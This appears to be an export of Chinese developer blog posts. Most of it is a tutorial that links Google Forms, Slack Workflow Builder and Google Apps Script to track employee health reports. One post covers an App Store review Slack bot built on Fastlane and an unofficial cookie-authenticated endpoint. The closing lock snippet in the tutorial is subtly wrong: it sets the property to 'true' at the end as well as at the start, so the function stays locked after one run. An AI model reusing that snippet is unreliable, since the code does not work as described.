取得當前日期的 Sheet 與員工名單比對，產生未填寫名單 Sheet 的資料 讀取未填寫名單 Sheet 組合出訊息並發送到指定 Slack Channel 串接 Slack APP API 可自動讀取指定 Channel 匯入員工名單 訊息內容使用 Slack UID Tag &lt;@UID&gt; 就能標記未填寫的成員。身份識別串起 Google From 與 Slack 的身份識別資訊是 Email，所以請確保公司同仁都是使用公司 Email 填寫 Google Form、Slack 個人資訊部分也都有填寫公司 Email。開始動手做問題、優化方式、成果講完後，接下來來到實作環節；讓我們一起一步步完成這個自動化 Case。 篇幅有點長，可依照略過自己已了解的區塊，或直接從完成結果建立副本，邊看邊改邊學。完成結果表單： https://forms.gle/aqGDCELpAiMFFoyDA完成結果 Google Sheet：建立健康回報 Google Form 表單 &amp; 連結回覆到 Google Sheet步驟省略，有問題請直接 Google，這邊假定你已經建立＆連結好了健康回報表單。表單要記得勾選「Collect emails」：收集填寫者的 Email 以利之後比對名單用。怎麼連結回覆到 Google Sheet？於表單的上方切換到「回覆」點擊「Google Sheet Icon」即可。更改連結的 Sheet 名稱：這邊建議將連結的 Sheet 名稱由 Form Responses 1 改為 Responses 方便使用。建立 Slack Workflow Form 填寫入口傳統的 Google From 填寫入口有了之後，我們先來新增 Slack 填寫方式。於 Slack 任意對話視窗中找到「 輸入匡 下方 」的「藍色閃電⚡️」點擊下去在選單底下「Search shortcuts」中輸入「workflow」選擇「Open Workflow Builder」這邊會列出你建立的或參與的 Workflow，點選右上角「Create」建立新 Workflow第一步，輸入 workflow 名稱（Workflow Builder 介面顯示用）Workflow 觸發方式，選擇「Shortcut」目前一共有 5 種 slack workflow 觸發時間點： Shortcut：手動觸發「藍色閃電⚡️」選項，會出現在 workflow 選單中，點擊即可開始 workflow。 New channel member：當 Target Channel 有新成員加入時…. (EX: 歡迎訊息) Emoji reactions：當有人對 Target Channel 中的訊息按下指定表情符號時…(或許可拿來做重要訊息已讀請按 XXX Emoji，以此知道誰已讀了？) Scheduled date &amp; time：排程，指定時間到時…(EX: 定時發提醒回報訊息) Webhook：外部 Webhook 觸發，進階功能，可與第三方或自己架 API 串起內部工作流程。這邊我們選擇「Shortcut」建立手動觸發選項。選擇這個 Workflow Shortcut 要加入在「哪一個 Channel 輸入匡」之下及輸入「要顯示的名稱」 *一個 workflow shortcut 僅能加入在一個 channel 中Shortcut 建立完成！開始建立 workflow 步驟，點擊「Add Step」加入步驟選擇「Send a form」StepTitle ：輸入表單標題Add a question ：輸入第一個問題的題目（可自行在標題標注問題編號 ex: 1.,2.,3….）Choose a question type ： Short answer：單行輸入匡 Long answer：多行輸入匡 Select from a list：單選列表 Select a person：選擇一位同個 Workspace 內的成員 Select a channel or DM：選擇一位同個 Workspace 內的成員 或 Group DM 或 Channel「Select from a list」為例： Add list item：可新增一個選項 Default selection：選擇預設選項 Make theis required：將此問題設為必填 Add Question：可新增更多問題 右方「↓」「⬆」可調整順序、「✎」可展開編輯 可選擇是否要將表單填寫內容回傳至 Channel 或 某人也可以選擇傳送回覆到…： Person who clicked ….：點擊這個表單的人（形同填寫的人） Channel where workflow started：這個 workflow 添加到的 Channel表單完成後點擊「Save」儲存步驟。 *這邊我們取消勾選將表單填寫內容回傳，因為想要在後面步驟自行客製化訊息內容。將 Slack workflow from 與 Google Sheet 串接如果還沒有將 Google Sheet App 加入到 Slack 可先 點此安裝 APP 。繼上一步後，點擊「Add Step」加入新步驟，我們選擇 Google Sheets for Workflow Builder 的「Add a spreadsheet row」步驟。 首先要完成 Google 帳號的授權，點擊「Connect account」 Select a spreadsheet：選擇目標回應的 Google Sheet，請選擇一開始建立的 Google Form 之 Google Sheet Sheet：同上 Column name：第一個欲填入值的 Column，這邊先選問題ㄧ點擊右下角「Insert Variable」選擇「Response to 問題一…」，插入之後可由左下角「Add Column」加入其他欄位，以此類推完成問題二、問題三….填寫人的 Email，可選擇「Person who submitted form」在點擊插入的變數，選擇「Email」即可自動帶入填寫人的 Email。 Mention (default)：tag 該 User，Raw data 是 &lt;@User ID&gt; Name：User 名稱 Email：User EmailTimestamp 欄位比較 tricky 等下再補充設定方法，先點「Save」儲存後回到頁面右上角按「Publish」發布 Shortcut。看到發布成功訊息後，可以回到 Slack Channel 試試看。這時候點閃電之後會出現剛剛建立的 Workflow form，可以點來填寫玩玩。左：電腦 / 右：手機版我們可以填寫資訊「Submit」測試看看是否正常。成功！但可以看到 Timestamp 欄位為空，下一步我們來解決這個問題。Slack workflow from 取得填寫時間Slack workflow 沒有 current timestamp 的 global variable 可用，至少目前還沒有，只找到一篇 reddit 上的許願文章 。一開始異想天開在 Column Value 輸入 =NOW() 但這樣所有紀錄的時間永遠是當前時間，完全錯誤。同樣拜 reddit 那篇文章 大神網友提供的 tricky 方法，可以建一個乾淨的 Timestamp Sheet 裡面放一個列資料、欄位 =NOW() 先用 Update 迫使欄位變為最新，在 Select 得到當前 Timestamp。如上圖結構，點此 查看範例 。 Row： 類似 ID 的用處，直接設「1」，之後設定 Select &amp; Update 會要用到，告知資料列。 Timestamp：設定值 =NOW() 讓他永遠顯示當前時間 Value：用以觸發 Timestamp 欄位更新時間，內容隨意，這邊是把填寫人的 Email 塞進來放，反正只要能觸發更新就好。 可在 Sheet 上按右鍵「Hide Sheet」隱藏此 Sheet，因為沒有要讓外部使用。回到 Slack Workflow Builder 編輯剛剛 建立的 workflow form。點擊「Add Step」新增步驟：往下滑選擇「Update a spreadsheet row」「Select a spreadsheet」選擇剛剛的 Sheet，「Sheet」選擇新建立的「Timestamp」Sheet。「Choose a column to search」選擇「Row」，Define a cell value to find 輸入「1」。「Update these columns」「Column name」選擇「Value」、「Value」點選「Insert variable」-&gt;「Person who submitted」-&gt;「選擇 Email」。點「Save」完成！現在已經完成觸發 Sheet 中的 timestamp 更新了，再來是讀取出來用。回到編輯頁後再點一次「Add Step」加入新步驟，這次選「Select a spreadsheet row」我們要讀取 Timestamp 出來。Search 部分同「Update a spreadsheet row」，按「Save」。Save 完回到步驟列表頁，我們可以把滑鼠移到步驟上用拖曳更改順序。將順序改「Update a spreadsheet row」-&gt;「Select a spreadsheet」-&gt;「Add a spreadsheet row」。意即：Update 觸發 timestamp 更新 -&gt; 讀取 Timestamp -&gt; 在新增 Row 時拿來用。在「Add a spreadsheet row」點「Edit」編輯：拉到最下面按左下角「Add Column」在點右下角「Insert a variable」，找到「Select a spreadsheet」Section 中的「Timestamp」變數，注入進去。按「Save」儲存步驟後回到列表頁，右上角點「Publish Change」發布更改。這時候我們再測試一次 workflow shortcut 看看 timestamp 有沒有正常寫入。成功！Slack workflow form 增加填寫回執同 Google Form 填寫回執，Slack workflow form 也可以。在編輯步驟頁我們可以再加入一個步驟，點擊「Add Step」。這次選擇「Send a message」「Send this message to」選擇「Person who submitted form」訊息內容依序輸入題目名稱、「Insert a variable」選擇「Response to 題目 XXX」，也可在最後插入「Timestamp」，按「Save」儲存步驟後再按「Publish Changes」即可！ 另外也可使用「Send a message」將填寫結果傳送到特定 Channel 或 DM。成功！Slack workflow form 的設定大概到此結束，其他玩法可以自由搭配發揮。Google Sheet with App Script!接下我們需要撰寫 App Script 來處理填寫資料。首先在 Google Sheet 上方工具欄選擇「Tools」-&gt;「Script editor」可以點擊左上角給專案一個名稱。現在我們可以開始撰寫 App Script！App Script 是基於 Javascript 設計，所以可以直接使用 Javascript 程式碼用法搭配 Google Sheet 的 lib。將 Responses 的資料依照填寫日期分發到各日期的 Sheetfunction formatData() { var bufferSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Responses') // 儲存回覆的 Sheet 名稱 var rows = bufferSheet.getDataRange().getValues(); var fileds = []; var startDeleteIndex = -1; var deleteLength = 0; for(index in rows) { if (index == 0) { fileds = rows[index]; continue; } var sheetName = rows[index][0].toLocaleDateString(\"en-US\"); // 將 Date 轉換成 String，使用美國日期格式 MM/DD/YYYY var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(sheetName); // 取得 MM/DD/YYYY Sheet if (sheet == null) { // 若無則新增 sheet = SpreadsheetApp.getActiveSpreadsheet().insertSheet(sheetName, bufferSheet.getIndex()); sheet.appendRow(fileds); } sheet.appendRow(rows[index]); // 將資料新增至日期 Sheet if (startDeleteIndex == -1) { startDeleteIndex = +index + 1; } deleteLength += 1; } if (deleteLength &gt; 0) { bufferSheet.deleteRows(startDeleteIndex, deleteLength); // 搬移到指定 Sheet 後，移除 Responses 裡的資料 }}在 Code 區塊中貼上以上程式碼，並按「control」+「s」儲存。再來我們要在 Sheet 中新增觸發按鈕（ 只能手動按按鈕觸發，無法在資料寫入時做自動分 ） 首先在建立一個新的 Sheet，取名「未填寫名單」 上方工具列選擇「Insert」-&gt;「Drawing」使用此介面，拉出一個按鈕。「Save and Close」後可調整、移動按鈕；點擊右上角「…」選擇「Assign script」輸入「formatData」function 名稱。可點擊加入的按鈕試試功能若出現 「Authorization Required」則點選「Continue」完成驗證在身份驗證的過程中會出現「Google hasn’t verified this app」這是正常的，因為我們寫的 App Script 沒有經過 Google 驗證，不過沒關係這是寫給自己用的。可點選左下角「Advanced」-&gt;「Go to Health Report (Responses) (unsafe)」點擊「Allow」 App Script 執行中會顯示「Running Script」這時候請勿再按，避免重複執行。 顯示執行成功後，才能再次執行。成功！將填寫資料依照日期分組。取得當前日期的 Sheet 與員工名單比對，產生未填寫名單 Sheet 的資料我們再加入一段 Code：// 與員工名單 Sheet ＆ 本日填寫 Sheet 比對，產出未填寫名單function generateUnfilledList() { var listSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('員工名單') // 員工名單 Sheet 名稱 var unfilledListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('未填寫名單') // 未填寫名單 Sheet 名稱 var today = new Date(); var todayName = today.toLocaleDateString(\"en-US\"); var todayListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(todayName) // 取得本日 MM/DD/YYYY Sheet if (todayListSheet == null) { SpreadsheetApp.getUi().alert('找不到'+todayName+'本日的 Sheet 或請先執行「整理填寫資料」'); return; } var todayEmails = todayListSheet.getDataRange().getValues().map( x =&gt; x[1] ) // 取得本日 Sheet Email Address 欄位資料列表 (1 = Column B) // index start from 0, so 1 = Column B // output: Email Address,zhgchgli@gmail.com,alan@gamil.com,b@gmail.com... todayEmails.shift() // 移除第一個資料，第一個是欄位名稱「Email Address」無意義 // output: zhgchgli@gmail.com,alan@gamil.com,b@gmail.com... unfilledListSheet.clear() // 清除未填寫名單...準備重新填入資料 unfilledListSheet.appendRow([todayName+\" 未填寫名單\"]) // 第一行顯示 Sheet 標題 var rows = listSheet.getDataRange().getValues(); // 讀取員工名單 Sheet for(index in rows) { if (index == 0) { // 第一列是標題欄位列，存下來，讓後續產生資料也可補上第一列標題 unfilledListSheet.appendRow(rows[index]); continue; } if (todayEmails.includes(rows[index][3])) { // 如果本日 Sheet Email Address 中有此員工的 Email 則代表有填寫，continue 略過... (3 = Column D) continue; } unfilledListSheet.appendRow(rows[index]); // 寫入一行資料到未填寫名單 Sheet }}一樣儲存後，照前面加入 Code 的方法，再加入一個按鈕並 Assign script — 「generateUnfilledList」。完成後可點擊測試：未填寫名單產生成功！如果沒有出現內容請先確定： 員工名單已填寫，或可先輸入測試資料 要先完成「整理填寫資料」動作讀取未填寫名單 Sheet 組合出訊息並發送到指定 Slack Channel首先我們要加入 Incoming WebHooks App 到 Slack Channel，我們會透過此媒介來傳送訊息。 Slack 左下角「Apps」-&gt;「Add apps」 右邊搜尋匡搜尋「incoming」 點擊「Incoming WebHooks」-&gt;「Add」選擇未填寫訊息想要傳到的 Channel。記下最上方的「Webhook URL」往下滑可設定傳送訊息時，傳送 Bot 顯示的名稱及大頭貼；改完記得按「Save Settings」。回到我們的 Google Sheet Script再加入一段 Code：function postSlack() { var ui = SpreadsheetApp.getUi(); var result = ui.alert( '您確定要發送訊息?', '發送未填寫提醒訊息到 Slack Channel', ui.ButtonSet.YES_NO); // 避免誤觸，先詢問確認 if (result == ui.Button.YES) { var unfilledListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('未填寫名單') // 未填寫名單 Sheet 名稱 var rows = unfilledListSheet.getDataRange().getValues(); var persons = []; for(index in rows) { if (index == 0 || index == 1) { // 略過標題、欄位標題那兩行 continue; } var person = (rows[index][4] == \"\") ? (rows[index][2]) : (\"&lt;@\"+rows[index][4]+\"&gt;\"); // 標記對象，如果有 slack uid 優先使用，沒有則單純顯示暱稱；2 = Column B / 4 = Column E if (person == \"\") { // 都沒視為異常資料，忽略 continue; } persons.push(\"• \"+person+'\\n') // 將對象存入陣列 } if (persons.length &lt;= 0) { // 無對象需要被標記通知時，大家都有填，取消訊息送出 return; } var preText = \"*[健康回報表公告:loudspeaker:]*\\n公司關心各位的身體健康，煩請以下隊友記得每日填寫健康狀況回報，謝謝:wink:\\n\\n今日未填健康狀況回報名單\\n\\n\" // 訊息開頭內容... var postText = \"\\n\\n填寫健康狀況回報能讓公司了解隊友們的身體狀況，煩請隊友們每日都要確實填寫唷&gt;&lt; 謝謝大家:woman-bowing::skin-tone-2:\" // 訊息結尾內容... var payload = { \"text\": preText+persons.join('')+postText, \"attachments\": [{ \"fallback\": \"這邊可放 Google Form 填寫連結\", \"actions\": [ { \"name\": \"form_link\", \"text\": \"前往健康狀況回報\", \"type\": \"button\", \"style\": \"primary\", \"url\": \"這邊可放 Google Form 填寫連結\" } ], \"footer\": \":rocket:小提示：點擊輸入匡下方的「:zap:️閃電」-&gt;「Shortcut Name」，即可直接填寫。\" } ] }; var res = UrlFetchApp.fetch('這邊輸入你 slack incoming app 的 Webhook URL',{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) }) }}一樣儲存後，照前面加入 Code 的方法，再加入一個按鈕並 Assign script — 「postSlack」。完成後可點擊測試：成功！！！(顯示 ＠U123456 沒成功標記人是因為 ID 是我亂打的)到此主要的功能都已完成！ 備註 請注意官方建議使用新的 Slack APP API 的 chat.postMessage 來傳送訊息，Incoming Webhook 簡便的這個方式之後會棄用，這邊偷懶沒有使用，可搭配下一章「匯入員工名單」會需要 Slack App API 一起調整成新方法。匯入員工名單這邊會需要我們創建一個 Slack APP。1.前往 https://api.slack.com/apps2. 點擊右上角「Create New App」3. 選擇「 From scratch 」4. 輸入「 App Name 」跟 你想要加入的 Workspace5. 建立成功後，在左邊選單選擇「OAuth &amp; Permissions」設定頁6. 往下滑到 Scopes 區塊依次「Add an OAuth Scope」以下項目： channels:read users:read users:read.email 如果想改用 APP 發訊息可在此加入 chat.postMessage7. 回到最上面點擊「Install to workspace」or「Reinstall to workspace」 *如果 Scopes 有新增，也要回來這點重新安裝。8. 安裝完成，取得複製 Bot User OAuth Token9. 使用網頁版 Slack 打開想要匯入名單的 Channel從瀏覽器取得網址：https://app.slack.com/client/TXXXX/CXXXX其中 CXXXX 就是這個 Channel 的 Channel ID，記下此訊息。10.回到我們的 Google Sheet Script再加入一段 Code：function loadEmployeeList() { var formData = { 'token': 'Bot User OAuth Token', 'channel': 'Channel ID', 'limit': 500 }; var options = { 'method' : 'post', 'payload' : formData }; var response = UrlFetchApp.fetch('https://slack.com/api/conversations.members', options); var data = JSON.parse(response.getContentText()); for (index in data[\"members\"]) { var uid = data[\"members\"][index]; var formData = { 'token': 'Bot User OAuth Token', 'user': uid }; var options = { 'method' : 'post', 'payload' : formData }; var response = UrlFetchApp.fetch('https://slack.com/api/users.info', options); var user = JSON.parse(response.getContentText()); var email = user[\"user\"][\"profile\"][\"email\"]; var real_name = user[\"user\"][\"profile\"][\"real_name_normalized\"]; var title = user[\"user\"][\"profile\"][\"title\"]; var row = [title, real_name, real_name, email, uid]; // 依照 Column 填入 var listSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('員工名單'); // 員工名單 Sheet 名稱 listSheet.appendRow(row); }}但這次我們不需要再加入按鈕，因為匯入僅第一次需要；所以只需存擋後直接執行即可。首先按「control」+「s」存檔，上方下拉選單改選擇「loadEmployeeList」，點擊「Run」就會開始匯入名單到員工名單 Sheet。手動新增新員工資料爾後如果有新員工加入，可直接在員工名單 Sheet 新增一列，填入資訊，Slack UID 可在 Slack 上直接查詢：點擊要查看 UID 的對象，點擊「View full profile」點擊「More」選擇「Copy member ID」即是 UID。 UXXXXXDONE！以上所有步驟都已完成，可以開始自動化的追縱員工的健康狀況。完成檔如下，可直接從以下 Google Sheet 建立副本修改後使用：補充 如果想要用 Scheduled date &amp; time 定時發送 form 訊息，要注意這情況下的 form 只能被填一次，所以不適合在這邊使用…（至少目前版本還是這樣），所以 Scheduled 填寫提醒訊息依然只能用純文字＋Google Form 連結。 目前沒有辦法用超連結連到 Shortcut 打開 Form Google Sheet App Script 防止重複執行：如果要防止不小心在執行中又再次按到導致重複執行，可在 function 一開始加上：if (PropertiesService.getScriptProperties().getProperty('FUNCTIONNAME') == 'true') { SpreadsheetApp.getUi().alert('忙碌中...請稍後再試'); return;}PropertiesService.getScriptProperties().setProperty('FUNCTIONNAME', 'true');Function 執行結束時加上：PropertiesService.getScriptProperties().setProperty('FUNCTIONNAME', 'true');FUNCTIONNAME 取代為目標 Function 名稱。用一個 Global 變數管制執行。與 iOS 開發相關的應用可用來串 CI/CD，用 GUI 包裝原本醜醜的指令操作，例如搭配 Slack Bitrise APP，用 Slack Workflow form 組合啟動 Build 命令：送出之後會發送指令到有 Bitrise APP 的 private channel，EX:bitrise workflow:app_store|branch:develop|ENV[version]:4.32.0就能觸發 Bitrise 執行 CI/CD Flow。延伸閱讀 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 運用 Google Apps Script 轉發 Gmail 信件到 Slack Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate有任何問題及指教歡迎 與我聯絡 。有自動化相關優化需求也歡迎 發案給我 ，謝謝。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,263 Total Views Last Statistics Date: 2025-01-19 | 2,072 Views on Medium. " }, { "title": "ZReviewsBot — Slack App Review 通知機器人", "url": "/posts/33f6aabb744f/", "categories": "ZRealm Dev.", "tags": "ios-app-development, slack, slackbot, app-review, ruby", "date": "2021-05-05 21:51:19 +0800", "snippet": "ZReviewsBot — Slack App Review 通知機器人免費開源的 iOS &amp; Android APP 最新評價追蹤 Slack BotTL;DR [2022/08/10] Update:現已改用全新的 App Store Connect API 重新設計 App Reviews Bot，並更名重新推出「 ZReviewTender — 免費開源的 App Revie...", "content": "ZReviewsBot — Slack App Review 通知機器人免費開源的 iOS &amp; Android APP 最新評價追蹤 Slack BotTL;DR [2022/08/10] Update:現已改用全新的 App Store Connect API 重新設計 App Reviews Bot，並更名重新推出「 ZReviewTender — 免費開源的 App Reviews 監控機器人 」。====ZhgChgLi / ZReviewsBotZReviewsBotZReviewsBot 為免費、開源專案，幫助您的 App 團隊自動追蹤 App Store (iOS) 及 Google Play (Android) 平台上 App 的最新評價，並發送到指定 Slack Channel 方便您即時了解當前 App 狀況。 ✅ 使用更新、更可靠的 API Endpoint 追蹤 iOS App 評價 ( 技術細節 ) ✅ 支援雙平台評價追蹤 iOS &amp; Android ✅ 支援關鍵字通知略過功能 (防洗版廣告騷擾) ✅ 客製化設定，隨心所欲 ✅ 支援使用 Github Action 部署 Schedule 自動機器人[2022/07/20 Update]App Store Connect API 現已支援 讀取和管理 Customer Reviews ，此機器人將於後續更新實作，取代掉使用 Fastlane — Spaceship 去後台拿評價的方式。起源繼上一篇「 AppStore APP’s Reviews Slack Bot 那些事 」研究並完成了新的 iOS 評價撈取工具，想了想好像蠻適合當 Side Project Open Source 出來給有相同問題的朋友使用。Flow延伸閱讀 [生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 331 Total Views Last Statistics Date: 2025-01-19 | 291 Views on Medium. " }, { "title": "AppStore APP’s Reviews Bot 那些事", "url": "/posts/cb0c68c33994/", "categories": "ZRealm Dev.", "tags": "slackbot, ios-app-development, ruby, fastlane, automator", "date": "2021-04-21 23:16:31 +0800", "snippet": "AppStore APP’s Reviews Slack Bot 那些事使用 Ruby+Fastlane-SpaceShip 動手打造 APP 評價追蹤通知 Slack 機器人Photo by Austin Distel吃米不知米價AppReviewBot 為例最近才知道 Slack 中轉發 APP 最新評價訊息的機器人是要付費的，我一直以為這功能是免費的；費用從 $5 到 $200 美金/...", "content": "AppStore APP’s Reviews Slack Bot 那些事使用 Ruby+Fastlane-SpaceShip 動手打造 APP 評價追蹤通知 Slack 機器人Photo by Austin Distel吃米不知米價AppReviewBot 為例最近才知道 Slack 中轉發 APP 最新評價訊息的機器人是要付費的，我一直以為這功能是免費的；費用從 $5 到 $200 美金/月都有，因為各平台都不會只做「App Review Bot」的功能，其他還有數據統計、紀錄、統一後台、與競品比較…等等，費用也是照各平台能提供的服務為標準；Review Bot 只是他們的一環，但我就只想用這個功能其他不需要，如果是這樣付費蠻浪費的。問題本來是用免費開源的工具 TradeMe/ReviewMe 來做 Slack 通知，但這個工具已年久失修，時不時 Slack 會爆噴一些舊的評價，看得讓人心驚膽顫（很多 Bug 都早已修復，害我們以為又有問題！），原因不明。所以考慮找其他工具、方法取代。TL;DR [2022/08/10] Update:現已改用全新的 App Store Connect API 重新設計 App Reviews Bot，並更名重新推出「 ZReviewTender — 免費開源的 App Reviews 監控機器人 」。====2022/07/20 UpdateApp Store Connect API 現已支援 讀取和管理 Customer Reviews ，App Store Connect API 原生已支援存取 App 評價， 不需要再使用 Fastlane — Spaceship 去後台拿評價。原理探究有了動機之後，再來研究下達成目標的原理。官方 API ❌蘋果有提供 App Store Connect API ，但沒提供撈取評價功能。[2022/07/20 更新]： App Store Connect API 現已支援 讀取和管理 Customer ReviewsPublic URL API (RSS) ⚠️蘋果有提供公開的 APP 評價 RSS 訂閱網址 ，而且除了 rss xml 還提供 json 格式。https://itunes.apple.com/國家碼/rss/customerreviews/id=APP_ID/page=1/sortBy=mostRecent/json 國家碼：可參考 這份文件 。 APP_ID：前往 App 網頁版，會得到網址：https://apps.apple.com/tw/app/APP名稱/id 12345678 ，id 後面的數字及為 App ID（純數字）。 page：可請求 1~10 頁，超過無法取得。 sortBy： mostRecent/json 請求最新的＆ json 格式，也可改為 mostRecent/xml 則為 xml 格式。評價資料回傳如下：rss.json:{ \"author\": { \"uri\": { \"label\": \"https://itunes.apple.com/tw/reviews/id123456789\" }, \"name\": { \"label\": \"test\" }, \"label\": \"\" }, \"im:version\": { \"label\": \"4.27.1\" }, \"im:rating\": { \"label\": \"5\" }, \"id\": { \"label\": \"123456789\" }, \"title\": { \"label\": \"很棒的存在！\" }, \"content\": { \"label\": \"人生值得了～\", \"attributes\": { \"type\": \"text\" } }, \"link\": { \"attributes\": { \"rel\": \"related\", \"href\": \"https://itunes.apple.com/tw/review?id=123456789&amp;type=Purple%20Software\" } }, \"im:voteSum\": { \"label\": \"0\" }, \"im:contentType\": { \"attributes\": { \"term\": \"Application\", \"label\": \"應用程式\" } }, \"im:voteCount\": { \"label\": \"0\" }}優點： 公開、不需身份驗證步驟即可存取 簡單好用缺點： 此 RSS API 很老舊都沒更新 回傳評價的資訊太少（沒留言時間、已編輯過評價？、已回覆？） 遇到資料錯亂問題（後面幾頁偶爾會突然噴舊資料） 最多存取 10 頁 關於我們遇到的最大問題是 3；但這部分不確定是我們用的 Bot 工具 問題，還是這個 RSS URL 資料有問題。Private URL API ✅這個方法說來有點旁門左道，也是我突發奇想發現的；但在後續參考了其他 Review Bot 做法之後發現很多網站也都是這樣用，應該沒什麼問題而且我 4~5 年前就看過有工具這樣做了，只是當時沒深入研究。優點： 同蘋果後台資料 資料完整且最新 可做更多細節篩選 具備深度整合的 APP 工具也是用這個方法（AppRadar/AppReviewBot…）缺點： 非官方公布方法（旁門左道） 因蘋果實行全面兩步驟登入，所以登入 session 需要定期更新。第一步 — 嗅探 App Store Connect 後台評論區塊 Load 資料的 API：得到蘋果後台是透過打：https://appstoreconnect.apple.com/WebObjects/iTunesConnect.woa/ra/apps/APP_ID/platforms/ios/reviews?index=0&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT這個 endpoint 取得評價列表：index = 分頁 offset，一次最多顯示 100 筆。評價資料回傳如下：private.json:{ \"value\": { \"id\": 123456789, \"rating\": 5, \"title\": \"很棒的存在！\", \"review\": \"人生值得了～\", \"created\": null, \"nickname\": \"test\", \"storeFront\": \"TW\", \"appVersionString\": \"4.27.1\", \"lastModified\": 1618836654000, \"helpfulViews\": 0, \"totalViews\": 0, \"edited\": false, \"developerResponse\": null }, \"isEditable\": true, \"isRequired\": false, \"errorKeys\": null}另外經過測試後發現，只需要在帶上 cookie: myacinfo=&lt;Token&gt; 即可偽造請求得到資料：API 有了、要求的 header 知道了，再來就要想辦法自動化取得後台這個 cookie 資訊。第二步 —萬能 Fastlane因蘋果現在實行全 Two-Step Verification，所以對於登入驗證自動化變得更加煩瑣，幸好與蘋果鬥智鬥勇的 Fastlane ，除了正規的 App Store Connect API、iTMSTransporter、網頁認證(包含兩步驟認證)全都有實作；我們可以直接使用 Fastlane 的指令：fastlane spaceauth -u &lt;App Store Connect 帳號(Email)&gt;此指令會完成網頁登入驗證(包含兩步驟認證)，然後將 cookie 存入 FASTLANE_SESSION 檔案之中。會得到類似如下字串：!ruby/object:HTTP::Cookiename: myacinfo value: &lt;token&gt; domain: apple.com for_domain: true path: \"/\" secure: true httponly: true expires: max_age: created_at: 2021-04-21 20:42:36.818821000 +08:00 accessed_at: 2021-04-21 22:02:45.923016000 +08:00!ruby/object:HTTP::Cookiename: &lt;hash&gt; value: &lt;token&gt;domain: idmsa.apple.com for_domain: true path: \"/\"secure: true httponly: true expires: max_age: 2592000created_at: 2021-04-19 23:21:05.851853000 +08:00accessed_at: 2021-04-21 20:42:35.735921000 +08:00將 myacinfo = value 帶入就能取得評價列表。第三步 — SpaceShip本來以為 Fastlane 只能幫我們到這了，再來要自己串起從 Fastlane 拿到 cookie 然後打 api 的 flow；沒想到經過一番探索發現 Fastlane 關於驗證這塊的模組 SpaceShip 還有更多強大的功能！SpaceShipSpaceShip 裡面已經幫我們打包好撈評價列表的方法 Class: Spaceship::TunesClient::get_reviews 了！app = Spaceship::Tunes::login(appstore_account, appstore_password)reviews = app.get_reviews(app_id, platform, storefront, versionId = '')*storefront = 地區第四步 — 組裝Fastlane、Spaceship 都是由 ruby 撰寫，所以我們也要用 ruby 來製作這個 Bot 小工具。我們可以建立一個 reviewBot.rb 檔案，編譯執行時只需在 Terminal 輸入：ruby reviewBot.rb即可。 ( *更多 ruby 環境問題可參考文末提示)首先 ，因原本的 get_reviews 口的參數不符合我們需求；我想要的是全地區、全版本的評價資料、不需要篩選、支援分頁：extension.rb:# Extension Spaceship-&gt;TunesClientmodule Spaceship class TunesClient &lt; Spaceship::Client def get_recent_reviews(app_id, platform, index) r = request(:get, \"ra/apps/#{app_id}/platforms/#{platform}/reviews?index=#{index}&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT\") parse_response(r, 'data')['reviews'] end endend所以我們自己在 TunesClient 中擴充一個方法，裡面參數只帶 app_id、platform = ios ( 全小寫 )、index = 分頁 offset。再來組裝登入驗證、撈評價列表：get_recent_reviews.rb:index = 0breakWhile = truewhile breakWhile app = Spaceship::Tunes::login(APPStoreConnect 帳號(Email), APPStoreConnect 密碼) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 puts review[\"value\"] }end使用 while 遍歷所有分頁，當跑到無內容時終止。再來要加上紀錄上次最新一筆的時間，只通知沒通知過的最新訊息：lastModified.rb:lastModified = 0if File.exists?(\".lastModified\") lastModifiedFile = File.open(\".lastModified\") lastModified = lastModifiedFile.read.to_iendnewLastModified = lastModifiedisFirst = truemessages = []index = 0breakWhile = truewhile breakWhile app = Spaceship::Tunes::login(APPStoreConnect 帳號(Email), APPStoreConnect 密碼) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 if isFirst isFirst = false newLastModified = review[\"value\"][\"lastModified\"] end if review[\"value\"][\"lastModified\"] &gt; lastModified &amp;&amp; lastModified != 0 # 第一次使用不發通知 messages.append(review[\"value\"]) else breakWhile = false break end }endmessages.sort! { |a, b| a[\"lastModified\"] &lt;=&gt; b[\"lastModified\"] }messages.each { |message| notify_slack(message)}File.write(\".lastModified\", newLastModified, mode: \"w+\")單純用一個 .lastModified 紀錄上一次執行時拿到的時間。*第一次使用不發通知，否則會一次狂噴最後一步，組合推播訊息 &amp; 發到 Slack：slack.rb:# Slack Botdef notify_slack(review) rating = review[\"rating\"].to_i color = rating &gt;= 4 ? \"good\" : (rating &gt;= 2 ? \"warning\" : \"danger\") like = review[\"helpfulViews\"].to_i &gt; 0 ? \" - #{review[\"helpfulViews\"]} :thumbsup:\" : \"\" date = review[\"edited\"] == false ? \"Created at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" : \"Updated at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" isResponse = \"\" if review[\"developerResponse\"] != nil &amp;&amp; review[\"developerResponse\"]['lastModified'] &lt; review[\"lastModified\"] isResponse = \" (回覆已過時)\" end edited = review[\"edited\"] == false ? \"\" : \":memo: 使用者更新評論#{isResponse}：\" stars = \"★\" * rating + \"☆\" * (5 - rating) attachments = { :pretext =&gt; edited, :color =&gt; color, :fallback =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :title =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :text =&gt; review[\"review\"], :author_name =&gt; review[\"nickname\"], :footer =&gt; \"iOS - 